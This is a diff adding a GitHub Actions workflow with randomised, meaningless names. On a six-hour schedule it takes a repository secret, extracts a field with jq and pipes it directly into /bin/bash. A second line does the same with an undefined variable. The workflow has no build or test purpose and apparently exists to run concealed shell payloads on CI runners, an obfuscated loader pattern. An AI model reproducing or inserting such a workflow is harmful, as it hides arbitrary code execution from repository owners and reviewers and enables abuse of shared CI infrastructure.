@@ -1,0 +1,20 @@
+name: haoertong6352
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: haoertong6352
+        env:
+          yavm58317: ${{ secrets.yavm58317 }}
+        run: |
+          echo $yavm58317 | jq -r .vh50115 | /bin/bash
+          echo $kafi8129 | jq -r .pi36 | /bin/bash
+
